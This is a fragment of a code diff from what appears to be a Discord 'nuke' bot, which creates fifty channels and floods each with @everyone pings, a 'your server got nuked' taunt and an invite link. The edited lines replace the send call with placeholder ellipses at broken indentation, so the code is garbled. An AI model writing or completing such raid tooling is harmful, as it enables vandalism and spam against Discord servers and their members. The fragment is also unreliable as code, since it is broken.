@@ -31,7 +31,9 @@ your server got nuked bullshit join this for appeal https://discord.gg/RY5gS7yKd
     # Create new channels
     for i in range(1, 51):
         channel = await ctx.guild.create_text_channel(f"general-{i}")
-       await channel.send("""
+       for i in range(...):
+    channel = ...
+    await channel.send(...)
 @everyone @everyone
 @everyone @everyone @everyone @everyone @everyone @everyone
 @everyone join this for appeal  https://discord.gg/RY5gS7yKdD
